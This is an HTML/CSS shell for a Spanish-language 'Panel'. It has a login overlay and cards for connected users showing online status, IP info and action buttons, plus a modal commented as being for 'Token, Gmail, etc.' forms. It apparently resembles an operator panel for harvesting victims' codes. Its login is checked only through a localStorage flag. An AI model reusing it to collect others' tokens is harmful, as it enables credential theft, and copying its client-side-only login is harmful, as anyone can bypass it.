<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Panel</title>

  <!-- 🔐 Oculta login si ya hay sesión activa -->
  <script>
    if (localStorage.getItem("panelLoggedIn") === "true") {
      document.write(`<style>#login-container { display: none !important; }</style>`);
    }
  </script>

  <!-- 🎨 Estilos -->
  <style>
    body {
      font-family: sans-serif;
      background-color: #161623;
      margin: 0;
      padding: 20px;
      color: white;
    }

    /* 🧩 LOGIN */
    #login-container {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background-color: #161623;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      overflow: hidden;
    }

    #login-box {
      background-color: #1f2333;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.6);
      width: 300px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    #login-box h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    #login-box input {
      width: 180px;
      padding: 5px 8px;
      font-size: 14px;
      margin: 8px 0;
      border: none;
      border-radius: 4px;
      text-align: center;
    }

    #login-box button {
      width: 180px;
      padding: 6px 10px;
      font-size: 14px;
      border: none;
      border-radius: 4px;
      background-color: #3498db;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    /* 🔝 Barra superior */
    #barra-superior {
      display: none;
      text-align: right;
      margin-bottom: 10px;
    }

    #barra-superior button {
      background-color: #3498db;
      color: white;
      border: none;
      padding: 8px 16px;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }

    /* ☁️ Nubes de usuarios */
    .nube {
      background: #26293b;
      border-radius: 10px;
      padding: 15px 20px;
      width: 700px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      position: relative;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .cerrar {
      position: absolute;
      top: 10px; right: 15px;
      cursor: pointer;
      font-size: 18px;
      font-weight: bold;
    }

    .estado-conexion {
      background-color: red;
      color: white;
      padding: 4px 12px;
      border-radius: 15px;
      font-size: 12px;
      display: inline-block;
      width: auto;
      max-width: 100px;
      text-align: center;
    }

    .verde { background-color: green !important; }
    .rojo { background-color: red !important; }

    .ip-info {
      font-size: 14px;
    }

    .datos-linea {
      display: flex;
      justify-content: space-between;
      border-top: 1px solid #888;
      border-bottom: 1px solid #888;
      padding: 10px 0;
      text-align: center;
    }

    .datos-linea div {
      flex: 1;
    }

    .datos-linea strong {
      display: block;
      font-size: 14px;
      margin-bottom: 5px;
    }

    .botones {
      display: flex;
      justify-content: flex-start;
      gap: 10px;
      margin-top: auto;
    }

    .btn {
      width: 90px;
      padding: 6px 0;
      border-radius: 5px;
      border: none;
      cursor: pointer;
      font-weight: bold;
      font-size: 13px;
      text-align: center;
    }

    /* 🎨 Botones de acción */
    .rojo { background-color: #e74c3c; color: white; }
    .azul { background-color: #3498db; color: white; }
    .naranja { background-color: orange; color: white; }
    .morado { background-color: #8e44ad; color: white; }
    .amarillo { background-color: #f1c40f; color: white; }
    .rosa { background-color: #e91e63; color: white; }
    .negro { background-color: #2c3e50; color: white; }

    /* 📋 Modal flotante */
    .modal-formulario {
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      background-color: #1f2333;
      padding: 20px;
      border-radius: 10px;
      z-index: 9998;
      width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.6);
    }

    .modal-formulario h4 {
      text-align: center;
      margin-bottom: 15px;
    }

    .modal-formulario input {
      width: 100%;
      padding: 6px;
      margin: 8px 0;
      border: none;
      border-radius: 5px;
    }

    .modal-buttons {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-top: 10px;
      flex-wrap: wrap;
    }

    /* 📦 Contenedor general de nubes */
    #contenedor {
      display: flex;
      flex-wrap: wrap;
      gap: 30px;
      justify-content: flex-start;
      align-items: flex-start;
    }

    /* 🎞 Fondo de video */
    #bg-video {
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: -1;
      opacity: 0.25;
      pointer-events: none;
    }
  </style>
</head>

<body>
  <!-- 🔐 Contenedor de Login -->
  <div id="login-container">
    <div id="login-box">
      <h2>Iniciar sesión</h2>
      <input type="text" id="usuario" placeholder="Usuario">
      <input type="password" id="clave" placeholder="Contraseña">
      <button onclick="verificarLogin()">Entrar</button>

      <!-- 🎞 Video de fondo para login -->
      <video autoplay muted loop id="bg-video">
        <source src="video.mp4" type="video/mp4">
        Tu navegador no soporta el video HTML5.
      </video>
    </div>
  </div>

  <!-- 🔼 Botón de cerrar sesión -->
  <div id="barra-superior">
    <button onclick="cerrarSesion()">Cerrar sesión</button>
  </div>

  <!-- ☁️ Nubes de usuarios -->
  <div id="contenedor" style="display:none;"></div>

  <!-- 📋 Modal para formularios (Token, Gmail, etc.) -->
  <div id="formulario-modal"></div>

  <!-- 🔊 Sonido de alerta al crear nube -->
  <audio id="alerta-sonido" src="sonido.mp3" preload="auto"></audio>

  <!-- 📦 Script principal -->
  <script type="module" src="panel.js"></script>
</body>
</html>
